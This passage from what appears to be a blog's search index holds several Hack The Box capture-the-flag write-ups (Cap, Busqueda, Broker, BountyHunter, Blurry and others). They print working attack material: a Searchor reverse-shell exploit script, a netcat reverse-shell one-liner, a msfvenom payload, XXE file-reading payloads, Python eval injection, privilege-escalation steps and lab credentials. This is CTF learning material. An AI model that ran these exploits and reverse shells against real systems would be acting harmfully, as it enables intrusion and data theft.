connection to sshwith joshuauser and transfer pspy64svia python3 simple server. Make it executable and run it:wget http://&lt;your_ip&gt;:&lt;port&gt;/pspy64schmod +x pspy64s./pspy64sIn other ssh connectionstart the /opt/scripts/mysql-backup.shand make password equal to*$ sudo /opt/scripts/mysql-backup.shEnter MySQL password for root: *Password confirmed!mysql: [Warning] Using a password on the command line interface can be insecure.Backing up database: mysqlmysqldump: [Warning] Using a password on the command line interface can be insecure.-- Warning: column statistics not supported by the server.mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLESmysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLESBacking up database: sysmysqldump: [Warning] Using a password on the command line interface can be insecure.-- Warning: column statistics not supported by the server.All databases backed up successfully!Changing the permissionsDone!Then check pspy64sand search for password:2024/08/08 10:43:07 CMD: UID=0 PID=2393 | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 syskljh12k3jhaskjh12kjh3 is password. After that become the root and read the flag:$ su rootPassword:root@codify:/home/joshua# cat /root/root.txtb8ad88846ff449e6ad4788eb309c6eadRoot Flag is: b8ad88846ff449e6ad4788eb309c6ead***" }, { "title": "Cap from HTB", "url": "/posts/Cap-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Cap from HTBnmapgave this:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn|_http-title: Security Dashboard|_http-server-header: gunicornAccess the 80 portwith IPthen click security snapshot ...URLbe like this:http://10.10.10.245/data/3 # there is an number at the end maybe change thathttp://10.10.10.245/data/0 # This will give us needed .pcap fileOpen the .pcapfile and follow streams of FTPYou will get the password and usernameUsername ---&gt; nathanPassword ---&gt; Buck3tH4TF0RM3!Go to sshand connect to it**User Flag is: a51aa4976cedcfbc93ee7308268c25de**Download linpeas.shand run it. You will findFiles with capabilities (limited to 50):/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eipThis means you can run python3.8with root UIDThen spawn an root shellusr/bin/python3.8&gt;&gt;&gt; import os&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; os.system(\"/bin/bash\")root@cap:~#Root Flag is: 6a31ea6a610e384a46ff746bc1b0797f***" }, { "title": "Busqueda from HTB", "url": "/posts/Busqueda-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Busqueda from HTBpageNmapgave this:$ nmap -sCV --min-rate 4000 -Pn -p- 10.10.11.208Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 05:32 +04Nmap scan report for 10.10.11.208Host is up (0.085s latency).Not shown: 65529 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)|_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Did not follow redirect to http://searcher.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)Add this to /etc/hostsfile:10.10.11.208 searcher.htbThen proceed to site.On the bottom it says that website is using Flask and Searchor version 2.4.0 .Search vulnerability for that version and first thing i got was this code from Github repository:#!/bin/bash -default_port=\"9001\"port=\"${3:-$default_port}\"rev_shell_b64=$(echo -ne \"bash -c 'bash -i &gt;&amp; /dev/tcp/$2/${port} 0&gt;&amp;1'\" | base64)evil_cmd=\"',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment\"plus=\"+\"echo \"---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---\"if [ -z \"${evil_cmd##*$plus*}\" ]then evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')fiif [ $# -ne 0 ]then echo \"[*] Input target is $1\" echo \"[*] Input attacker is $2:${port}\" echo \"[*] Run the Reverse Shell... Press Ctrl+C after successful connection\" curl -s -X POST $1/search -d \"engine=Google&amp;query=${evil_cmd}\" 1&gt; /dev/nullelse echo \"[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example:./exploit.sh &lt;TARGET&gt; &lt;ATTACKER&gt; &lt;PORT&gt; [9001 by default]\"fiand to run it you need to do this:/exploit.sh &lt;site_name&gt; &lt;your_ip&gt; &lt;port&gt;Run that with NetCatand you will get the connection:$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.11.208] 46656bash: cannot set terminal process group (1648): Inappropriate ioctl for devicebash: no job control in this shellsvc@busqueda:/var/www/app$ lslsapp.pytemplatesWe are in.The user flag is located in `/home/svc/user.txt:$ cat user.txtcat user.txte059d11d9d87ab4920a2b94b7f8bbc80User Flag — e059d11d9d87ab4920a2b94b7f8bbc80***Check out the other directories:svc@busqueda:/var/www/app$ cd .gitcd .gitsvc@busqueda:/var/www/app/.git$ lslsbranchesCOMMIT_EDITMSGconfigdescriptionHEADhooksindexinfologsobjectsrefssvc@busqueda:/var/www/app/.git$ cat configcat config[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true[remote \"origin\"] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/*[branch \"main\"] remote = origin merge = refs/heads/mainthere is Username —&gt; cody Password —&gt; jh1usoih2bkjaspwe92And also there is subdomain of searcher.htb —-&gt; gitea.searcher.htb, copy that and add to /etc/hosts:10.10.11.208 gitea.searcher.htbGo to that site and login as cody.There is nothing special. TBH i havn't explored itConnect to sshwith name of svcand password of jh1usoih2bkjaspwe92.$ ssh svc@10.10.11.208The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.208' (ED25519) to the list of known hosts.svc@10.10.11.208's password:Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Aug 6 01:47:13 AM UTC 2024 System load: 0.080078125 Usage of /: 80.2% of 8.26GB Memory usage: 49% Swap usage: 0% Processes: 236 Users logged in: 0 IPv4 address for br-c954bf22b8b2: 172.20.0.1 IPv4 address for br-cbf2c5ce8e95: 172.19.0.1 IPv4 address for br-fba5a3e31476: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.208 IPv6 address for eth0: dead:beef::250:56ff:fe94:65a3 * Introducing Expanded Security Maintenance for Applications. Receive updates to over 25,000 software packages with your Ubuntu Pro subscription. Free for personal use. https://ubuntu.com/proExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Apr 4 17:02:09 2023 from 10.10.14.19svc@busqueda:~$ lsuser.txtWe are in. Now check what you can do with rootpermission.$ sudo -l[sudo] password for svc:Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py *If you run the command given by the sudo -l you will get kind of help:$ /usr/bin/python3 /opt/scripts/system-checkup.py *Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkupRun the commands one-by-one and one you will need is docker-inspect, because it reads something that you will need to access the admin repository in gitea.searcher.htb. It will need certain type of commands because it is docker:svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '' gitea | jqThis will list bunch of text and you will need to search for GITEA_database_ user and password: \"Env\": [ \"USER_UID=115\", \"USER_GID=121\", \"GITEA__database__DB_TYPE=mysql\", \"GITEA__database__HOST=db:3306\", \"GITEA__database__NAME=gitea\", \"GITEA__database__USER=gitea\", \"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\", \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"USER=git\", \"GITEA_CUSTOM=/data/gitea\" ],User —- giteaPassword — yuiu1hoiu4i5ho1uhAccording to the information provided here, Docker leverages Go templates that enable users to modify the output format of specific commands. The website specifically mentions the usage of the formatting template, which renders all the information about the container in the `JSON` format. Thus, we can use as the format argument required by the docker-inspect argument of the script.To read the JSON output conveniently, we can use jq to parse the JSON output into a readable format. jq can be installed using the following command, however, it is already present on the target machine.Now go to gitea.searcher.htband login asUsername —&gt; administratorPassword —&gt; yuiu1hoiu4i5ho1uhand you will see the repository named scriptswhere is located scripts which you will need to use to get the root.If you run the third full-checkupit access the running docker and get’s the information from it. So if we change that file with some other file that will be in other directory that will have the code to execute reverse-shellfor us to get connection, it’s going to be solved.To think logically code gives us three choices and all of them are scripts. You can --ls-- the directory the full-checkup is named full-checkup.sh.We have to create file named full.checkup.shin other directory and give it the reverse shell.$ echo -en \"#! /bin/bash\\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;your_ip&gt; &lt;port&gt; &gt;/tmp/f\" &gt; /tmp/full-checkup.shSo the file is in /tmpdirectory. Use chmod +xto make it executable. Then run it with the same code you ran it before but now you should be in the /tmpdirectory:svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkupDon’t forget to open NetCaton you port.***$ nc -nlvp 5555listening on [any] 5555 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.11.208] 35592# lsffull-checkup.shsnap-private-tmpsystemd-private-db88f2932a09492e8a045aee99a137bc-apache2.service-V1REUqsystemd-private-db88f2932a09492e8a045aee99a137bc-ModemManager.service-FPvDjxsystemd-private-db88f2932a09492e8a045aee99a137bc-systemd-logind.service-Q7yHxgsystemd-private-db88f2932a09492e8a045aee99a137bc-systemd-resolved.service-xVNwz1systemd-private-db88f2932a09492e8a045aee99a137bc-systemd-timesyncd.service-tWB19hvmware-root_787-4290625459# cd /root# lsecosystem.config.jsroot.txtscriptssnap# cat root.txt26b8ae6da611ba28b3b7fd2743e51ff3The Root Flag is: 26b8ae6da611ba28b3b7fd2743e51ff3***" }, { "title": "Builder from HTB", "url": "/posts/Builder-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Builder from HTBnmapgave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)1566/tcp filtered corelvideo8080/tcp open http Jetty 10.0.18|_http-title: Dashboard [Jenkins]| http-robots.txt: 1 disallowed entry |_/| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Jetty(10.0.18)Accessing the 8080port we find that site runs on jenkins 2.441which is exploitable.wget 10.10.11.10:8080/jnlpJars/jenkins-cli.jarjava -jar jenkins-cli-2.441.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help \"@/etc/passwd\"-------------------- COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)------------\\java -jar jenkins-cli-2.441.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help \"@/proc/self/environ\"-----------------HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https&lt;snip&gt;JENKINS_HOME=/var/jenkins_home&lt;snip&gt;We find that home directory is in /var/jenkins_homewe can read user.txtin there**User Flag is: 392c37d12e3c7774b81d37323c1b66bd.**" }, { "title": "Broker from HTB", "url": "/posts/Broker-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Broker from HTBpageNmap gave this:nmap -sCV --min-rate 4000 10.10.11.243 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 20:38 +04Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 88.89% done; ETC: 20:39 (0:00:02 remaining)Nmap scan report for 10.10.11.243Host is up (0.087s latency).Not shown: 65520 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Error 401 Unauthorized|_http-server-header: nginx/1.18.0 (Ubuntu)| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm1883/tcp open mqtt| mqtt-subscribe:| Topics and their most recent payloads:| ActiveMQ/Advisory/Consumer/Topic/#:|_ ActiveMQ/Advisory/MasterBroker:5672/tcp open amqp?| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:| AMQP| AMQP| amqp:decode-error|_ 7Connection from client using unsupported AMQP attempted|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 657328/tcp filtered swx8161/tcp open http Jetty 9.4.39.v20210325|_http-title: Error 401 Unauthorized| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm|_http-server-header: Jetty(9.4.39.v20210325)17431/tcp filtered unknown35037/tcp open tcpwrapped47098/tcp filtered unknown53708/tcp filtered unknown54578/tcp filtered unknown57832/tcp filtered unknown61613/tcp open stomp Apache ActiveMQ| fingerprint-strings:| HELP4STOMP:| ERROR| content-type:text/plain| message:Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)|_ java.lang.Thread.run(Thread.java:750)61614/tcp open http Jetty 9.4.39.v20210325|_http-server-header: Jetty(9.4.39.v20210325)|_http-title: Site doesn't have a title.| http-methods:|_ Potentially risky methods: TRACE61616/tcp open apachemq ActiveMQ OpenWire transport| fingerprint-strings:| NULL:| ActiveMQ| TcpNoDelayEnabled| SizePrefixDisabled| CacheSize| ProviderName| ActiveMQ| StackTraceEnabled| PlatformDetails| Java| CacheEnabled| TightEncodingEnabled| MaxFrameSize| MaxInactivityDuration| MaxInactivityDurationInitalDelay| ProviderVersion|_ 5.15.15If you try to access the site with IPyou can’t because it needs password and username. If you try all the ports you will get nothing. There is one interesting port 61616where ApacheMQ 5.15.15is running on. I went and searched for exploit and found this GithubRepository: https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ, which can help me access the server with NetCat:msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elfpython3 -m http.server 8001 &amp; # to run in backgroundnvim poc-linux.xml # Add your IP and PORTnc -nlvp &lt;port&gt;Get the connection by :go run main.go -i 10.10.11.243 -p 61616 -u http://&lt;your_IP&gt;:&lt;PORT&gt;/poc-linux.xmluse script /dev/null -c bashto activate the shell after connecting:script /dev/null -c bashScript started, output log file is '/dev/null'.activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt8bda8fe33a8e63e0d6607091cd018d1bUser Flag: 8bda8fe33a8e63e0d6607091cd018d1b***Then learn what you can run with root permission:sudo -lsudo -lMatching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginxWe’ll use this script for nginxprivilege escalation:cat nginx.confuser root;worker_processes auto;pid /tmp/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events { worker_connections 768;}http{ server { listen 1337; location / { root /; } }}Im too lazy to write more and i also don't have knowledgeThen run this command with nginx. Note that nginx will need absolute directorysudo nginx -c /dev/shm/nginx.confss -tlpmState Recv-Q Send-Q Local Address:Port Peer Address:PortProcessLISTEN 0 511 0.0.0.0:http 0.0.0.0:*\t skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d10)LISTEN 0 4096 127.0.0.53%lo:domain 0.0.0.0:*\t skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d0)LISTEN 0 128 0.0.0.0:ssh 0.0.0.0:*\t skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d3)LISTEN 0 511 0.0.0.0:1337 0.0.0.0:*open 1337port means that our script is working.***Then get the root flag with curl:curl localhost:1337/root/root.txt0e840a3e3a0cffc313db9d602283627c" }, { "title": "bountyhunter from HTB", "url": "/posts/BountyHunter-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "bountyhunter from HTBthis is vulnerable http://10.10.11.100/log_submit.phpafter sending the payload with burpsuite + interceptwe see thisdata=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5naW88L3RpdGxlPgoJCTxjd2U%2BZ2lvPC9jd2U%2BCgkJPGN2c3M%2BZ2lvPC9jdnNzPgoJCTxyZXdhcmQ%2BMzE8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3Dwhich is base64and xml fileso we can create an xml codefor xxe, encode it and then send it to read files.xml file&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY help SYSTEM \"file:///etc/passwd\"&gt; ]&gt;&lt;bugreport&gt;&lt;title&gt;test&lt;/title&gt;&lt;cwe&gt;test&lt;/cwe&gt;&lt;cvss&gt;test&lt;/cvss&gt;&lt;reward&gt;&amp;help;&lt;/reward&gt;&lt;/bugreport&gt;encode it with base64and url-encodeit in burpsuite, then send it. &lt;td&gt;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindevelopment:x:1000:1000:Development:/home/development:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falseusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin&lt;/td&gt;we can also read other files for example db.php&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/db.php\"&gt; ]&gt;&lt;bugreport&gt;&lt;title&gt;test&lt;/title&gt;&lt;cwe&gt;test&lt;/cwe&gt;&lt;cvss&gt;test&lt;/cvss&gt;&lt;reward&gt;&amp;file;&lt;/reward&gt;&lt;/bugreport&gt;then send it like you sent last payloaddata=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8IURPQ1RZUEUgZGF0YSBbCjwhRU5USVRZIGZpbGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvcmVhZD1jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9kYi5waHAiPiBdPgo8YnVncmVwb3J0Pgo8dGl0bGU%2bdGVzdDwvdGl0bGU%2bCjxjd2U%2bdGVzdDwvY3dlPgo8Y3Zzcz50ZXN0PC9jdnNzPgo8cmV3YXJkPiZmaWxlOzwvcmV3YXJkPgo8L2J1Z3JlcG9ydD4Kreceived&lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt;after decoding it we get&lt;?php// TODO -&gt; Implement login system with the database.$dbserver = \"localhost\";$dbname = \"bounty\";$dbusername = \"admin\";$dbpassword = \"m19RoAU0hP41A1sTsq6K\";$testuser = \"test\";?&gt; Username developmentPassword m19RoAU0hP41A1sTsq6KConnect to sshwith this credentials**User Flag is: 6f65620c3365fe07df57b2b5afab035e**after running linpeas.sh╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suidMatching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pylet’s check it#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\"# Skytrain Inc\"): return False continue if i == 1: if not x.startswith(\"## Ticket to \"): return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) if validationNumber &gt; 100: return True else: return False return Falsedef main(): fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.closemain()so the file must be .md, start with # Skytrain Inc, ## Ticket to, __Ticket Code:__ and so on. i’m lazy to type# Skytrain Inc## Ticket to Mars__Ticket Code:__**179+ 25 == 204 and __import__('os').system('bash') == Truethen$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pyPlease enter the path to the ticket file./tmp/help.mdDestination: Marsroot@bountyhunter:/home/development#Root Flag is: dca9a40f86c13ba3896ee0d9c11967de***" }, { "title": "Blurry from HTB", "url": "/posts/Blurry-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Blurry from HTBpageNmapgave this:$ nmap -sCV --min-rate 4000 -Pn 10.10.11.19Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 20:48 +04Nmap scan report for app.blurry.htb (10.10.11.19)Host is up (0.18s latency).Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)| ssh-hostkey:| 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)| 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)|_ 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)80/tcp open http nginx 1.18.0|_http-title: ClearML|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.22 secondsThere is site on this so lets add it to /etc/hosts:10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb api.blurry.htbAfter accessing the blurry.htbyou will get why i added all those additional subdomains.There is subdomains.Also there is instruction to what to do, so do it, set it up. Don’t do the last part.After searching for the clearMLexploits i got to this github repostiroyfor RCE exploit.$ git clone https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit.git$ cd CVE-2024-24590-ClearML-RCE-Exploit$ python3 exploit.pyAfter running it select the 2option and give the stuff it tells you. It will make the server connect to you. Don’t forget NetCat$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.47] from (UNKNOWN) [10.10.11.19] 50934bash: cannot set terminal process group (65981): Inappropriate ioctl for devicebash: no job control in this shelljippity@blurry:~$ lslsautomationclearml.confcreate_evil.pyevil.pthscript.pyuser.txtjippity@blurry:~$ cat user.txtcat user.txta499da12aac54d2415546d560ef24d4cuser flag: a499da12aac54d2415546d560ef24d4c***$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.47] from (UNKNOWN) [10.10.11.19] 50934bash: cannot set terminal process group (65981): Inappropriate ioctl for devicebash: no job control in this shell$ ls -lals -latotal 72drwxr-xr-x 6 jippity jippity 4096 Aug 3 12:21 .drwxr-xr-x 3 root root 4096 Feb 6 14:00 ..drwxr-xr-x 2 jippity jippity 4096 Aug 3 09:40 automationlrwxrwxrwx 1 root root 9 Feb 17 13:03 .bash_history -&gt; /dev/null-rw-r--r-- 1 jippity jippity 220 Feb 6 14:00 .bash_logout-rw-r--r-- 1 jippity jippity 3570 Feb 6 14:25 .bashrcdrwxr-xr-x 9 jippity jippity 4096 Feb 8 10:07 .clearml-rw-r--r-- 1 jippity jippity 11007 Feb 17 11:07 clearml.conf-rw-r--r-- 1 jippity jippity 29 Feb 6 14:41 .clearml_data.json-rw-r--r-- 1 jippity jippity 155 Aug 3 12:21 create_evil.py-rw-r--r-- 1 jippity jippity 852 Aug 3 12:21 evil.pth-rw-r--r-- 1 jippity jippity 22 Feb 8 10:16 .gitconfigdrwx------ 5 jippity jippity 4096 Feb 6 14:46 .local-rw-r--r-- 1 jippity jippity 807 Feb 6 14:00 .profilelrwxrwxrwx 1 root root 9 Feb 17 13:03 .python_history -&gt; /dev/null-rw-r--r-- 1 jippity jippity 741 Aug 3 10:12 script.pydrwx------ 2 jippity jippity 4096 Aug 3 05:22 .ssh-rw-r----- 1 root jippity 33 Aug 2 06:01 user.txtthere is .sshdirectory and probably you will use it for sshconnection.jippity@blurry:~$ cd .sshcd .sshjippity@blurry:~/.ssh$ lslsauthorized_keysdemo.pthid_rsaid_rsa.pubjippity@blurry:~/.ssh$ cat idcat id_rsa-----BEGIN OPENSSH PRIVATE 